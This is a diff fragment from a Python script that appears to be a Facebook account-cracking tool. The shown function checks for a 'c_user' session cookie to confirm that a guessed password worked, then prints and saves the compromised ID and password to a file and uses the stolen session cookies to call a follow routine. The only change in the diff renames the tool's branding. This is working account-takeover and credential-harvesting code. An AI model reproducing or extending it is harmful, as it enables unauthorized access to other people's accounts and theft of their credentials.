@@ -369,10 +369,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ MIRAZ-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ ABIR-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/MIRAZ-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/ABIR-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
